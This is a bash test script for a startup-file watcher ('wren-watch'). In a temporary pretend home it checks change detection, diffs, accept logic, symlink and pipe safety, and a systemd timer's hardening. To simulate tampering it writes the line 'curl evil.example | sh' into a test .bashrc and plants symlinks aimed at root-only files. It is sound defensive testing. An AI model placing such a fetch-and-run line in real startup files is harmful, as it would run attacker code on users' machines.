#!/bin/bash
# Checks the startup watch (bin/wren-watch, extras/startup-watch.sh) in a
# pretend home, with its record and its list of changes in temp folders: what
# it watches and what it doesn't; it follows no link and doesn't hang on a
# pipe; a changed, new or gone file is listed, and the bar shows it; accepting
# some files leaves the others listed, accepting all clears it; wrenctl takes
# what its own run changed, but not a file that had changed before; root's
# timer service is locked down. Nothing outside a temp folder changes.
# Run by test.sh, or:  bash tools/test-startup-watch.sh
# shellcheck disable=SC2016  # the inner shells and pretend programs expand their own variables
HERE=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
W=$HERE/bin/wren-watch
T=$(mktemp -d) || { echo "  FAIL  couldn't make a temp folder (is /tmp full?)"; exit 1; }
trap 'rm -rf "$T"' EXIT
fails=0
check() { # DESCRIPTION CONDITION-COMMAND...
    local what=$1
    shift
    if "$@" >/dev/null 2>&1; then printf '  ok    %s\n' "$what"; else printf '  FAIL  %s\n' "$what"; fails=$((fails + 1)); fi
}
not() { ! "$@"; }
ME=$(id -un)
H=$T/home
# (WREN_WATCH_HOME: the pretend home, so nothing of this computer's real home is read)
export WREN_WATCH_STATE=$T/state WREN_WATCH_RUN=$T/run WREN_WATCH_HOME=$T/home
mkdir -p "$H/.config/sway" "$H/.config/autostart" "$H/.local/bin" "$H/Documents"
echo 'export A=1' >"$H/.bashrc"
echo 'set $mod Mod4' >"$H/.config/sway/config"
printf '[Desktop Entry]\nExec=true\n' >"$H/.config/autostart/a.desktop"
printf '#!/bin/sh\n' >"$H/.local/bin/x"
echo TOPSECRET >"$T/secret"
ln -s "$T/secret" "$H/.local/bin/link"
mkfifo "$H/.config/autostart/pipe"
echo "not watched" >"$H/Documents/notes"
ww() { HOME=$H timeout 20 bash "$W" "$@" 2>&1; }

out=$(ww manifest)
check "it watches your shell's startup files, sway's config, autostart, ~/.local/bin" bash -c '
    for p in .bashrc .config/sway/config .config/autostart/a.desktop .local/bin/x; do grep -qE " $p$" <<<"$1" || { echo "$p"; exit 1; }; done' _ "$out"
check "...not your other files" not grep -q 'Documents' <<<"$out"
check "...a link as a link: what it points to isn't read" bash -c 'grep -qE "^link .* \.local/bin/link$" <<<"$1"' _ "$out"
check "...and a pipe neither hangs it nor is read" grep -qE '^other .* \.config/autostart/pipe$' <<<"$out"

ww accept >/dev/null
check "accept: the record, root's alone (0600), with copies for diff" bash -c '
    [ "$(stat -c %a "$1/state/'"$ME"'/manifest")" = 600 ] && [ -f "$1/state/'"$ME"'/copies/.bashrc" ] && ! grep -rqs TOPSECRET "$1/state"' _ "$T"
check "...nothing listed" test ! -e "$T/run/$ME"
check "...and nothing for the bar" test -z "$(WREN_WATCH_RUN=$T/run sh "$HERE/bin/sway-status" --startup)"
check "nothing changed: wren-watch says so" grep -q 'Nothing changed' <<<"$(ww)"

echo 'curl evil.example | sh' >>"$H/.bashrc"
printf '[Desktop Entry]\nExec=evil\n' >"$H/.config/autostart/b.desktop"
rm "$H/.local/bin/x"
echo "still not watched" >>"$H/Documents/notes"
ww check-all >/dev/null
check "a changed, a new and a gone file are listed, and nothing else" \
    test "$(cat "$T/run/$ME" 2>/dev/null)" = "$(printf '%s\n' .bashrc .config/autostart/b.desktop .local/bin/x)"
check "...the bar shows \"startup changed\"" test "$(sh "$HERE/bin/sway-status" --startup)" = "startup changed"
check "...wren-watch lists them, and says how to look and accept" bash -c 'o=$(HOME=$1 bash "$2" 2>&1); grep -q "~/.bashrc" <<<"$o" && grep -q "sudo wren-watch accept" <<<"$o"' _ "$H" "$W"
check "...diff shows what changed in a text file" grep -q '^+curl evil.example | sh$' <<<"$(ww diff)"

check "...and what to do if it wasn't you" bash -c 'o=$(HOME=$1 bash "$2" 2>&1); grep -q "If it was neither" <<<"$o" && grep -q "When something goes wrong" <<<"$o"' _ "$H" "$HERE/bin/wren-watch"
ww accept .bashrc >/dev/null
check "accepting one file: it goes from the list, the others stay" \
    test "$(cat "$T/run/$ME")" = "$(printf '%s\n' .config/autostart/b.desktop .local/bin/x)"
check "...and their diff still shows the old against the new" grep -q 'Exec=evil' <<<"$(ww diff)"
ww accept >/dev/null
check "accepting all: the list is gone" test ! -e "$T/run/$ME"
check "a path outside your home can't be accepted" not ww accept ../../etc/passwd
check "...and without root (no test folder), accept is refused" bash -c '! env -u WREN_WATCH_STATE -u WREN_WATCH_HOME HOME=$1 bash "$2" accept 2>/dev/null' _ "$H" "$W"

# wrenctl: what its own run changed is taken; a file that had changed before is not
D=$T/wren
mkdir -p "$D/parts" "$T/fake"
: >"$D/lib.sh"
printf '#!/bin/bash\necho "# added by a Wren Linux part" >>"$HOME/.bashrc"\n' >"$D/parts/demo.sh"
printf '#!/bin/sh\necho "sudo $*" >>"%s/sudo-calls"\nexec "$@"\n' "$T" >"$T/fake/sudo"
chmod +x "$T/fake/sudo"
wc_part() { env HOME="$H" WREN_DIR="$D" WREN_WATCH_CMD="$W" PATH="$T/fake:$PATH" bash "$HERE/bin/wrenctl" part demo 2>&1; }
out=$(wc_part)
check "wrenctl part: what the run changed is taken as Wren Linux's, through sudo" bash -c '
    grep -q "sudo .*wren-watch accept .bashrc" "$1" && [ ! -e "$2/run/'"$ME"'" ] && grep -q "taking what this changed" <<<"$3"' _ "$T/sudo-calls" "$T" "$out"
echo 'evil' >>"$H/.bashrc"
ww check-all >/dev/null
: >"$T/sudo-calls"
out=$(wc_part)
check "...a file that had changed before the run isn't taken (that change is for you to see)" bash -c '
    ! grep -q "accept" "$1" && grep -q "had changed before this run" <<<"$2" && grep -qx .bashrc "$3/run/'"$ME"'"' _ "$T/sudo-calls" "$out" "$T"

# root's timer
X=$HERE/extras/startup-watch.sh
check "root's check: every 15 minutes and at boot; it may write only its record and list, no network" bash -c '
    for s in OnUnitActiveSec=15min OnBootSec=1min ProtectSystem=strict ProtectHome=read-only PrivateNetwork=yes NoNewPrivileges=yes "ReadWritePaths=/var/lib/wren-watch /run/wren-watch"; do
        grep -qF "$s" "$1" || { echo "$s"; exit 1; }; done' _ "$X"
check "...and accept is never passwordless (no sudoers rule for it)" not grep -qE 'NOPASSWD|sudoers' "$X"
check "the bar notifies when a change appears, and a click shows it" bash -c '
    grep -q "Your startup files changed" "$1" && grep -q "sudo wren-watch diff" "$1"' _ "$HERE/bin/sway-status"

# Root reads these files (sudo wren-watch diff, accept, its timer), and a program
# running as you can plant anything in them: no link may lead it to a root-only
# file, or the signing key
ww accept >/dev/null
echo ROOTONLY >"$T/rootonly"
ln -s "$T/rootonly" "$H/.local/bin/planted"
ww check-all >/dev/null
out=$(ww diff)
check "diff: a planted link is named, with where it points" grep -qF '.local/bin/planted is a link to' <<<"$out"
check "...and what it points at is never shown" not grep -q ROOTONLY <<<"$out"
rm "$H/.local/bin/planted"
ww accept >/dev/null
printf 'old\n' >"$H/.local/bin/changed"
ww accept >/dev/null
rm "$H/.local/bin/changed"
ww check-all >/dev/null
check "diff: a file that went shows its old lines as removed" grep -q '^-old$' <<<"$(ww diff)"
ww accept >/dev/null
printf 'brand new\n' >"$H/.local/bin/fresh"
ww check-all >/dev/null
check "diff: a new file shows its lines as added" grep -q '^+brand new$' <<<"$(ww diff)"
rm "$H/.local/bin/fresh"
mkfifo "$H/.local/bin/apipe"
ww check-all >/dev/null
check "diff: a pipe planted there doesn't hang it" bash -c 'HOME=$1 timeout 10 bash "$2" diff >/dev/null 2>&1' _ "$H" "$W"
rm "$H/.local/bin/apipe"
ww accept >/dev/null
# a link further up the path: ~/.ssh pointing at root's
mkdir -p "$T/rootssh"
echo ROOTCONFIG >"$T/rootssh/config"
ln -s "$T/rootssh" "$H/.ssh"
out=$(ww manifest)
check "a link on the way to a watched file: noticed" grep -qE '^linked .* \.ssh/config$' <<<"$out"
check "...nothing behind it is read" not grep -qE '^file .* \.ssh/config$' <<<"$out"
ww accept >/dev/null
check "...nor copied into root's record" test ! -e "$T/state/$ME/copies/.ssh/config"
rm "$H/.ssh"
mkdir -p "$T/otherbin"
echo x >"$T/otherbin/tool"
mv "$H/.config/autostart" "$T/autostart.real"
ln -s "$T/otherbin" "$H/.config/autostart"
out=$(ww manifest)
check "a watched folder that is itself a link: not walked" not grep -q 'autostart/tool' <<<"$out"
rm "$H/.config/autostart"
mv "$T/autostart.real" "$H/.config/autostart"
check "root reads your live files as you, never as root" bash -c '
    grep -q "setpriv --reuid=" "$1" && ! grep -qE "diff .*\"\\\$home/\\\$rel\"" "$1"' _ "$W"

[ "$fails" -eq 0 ]
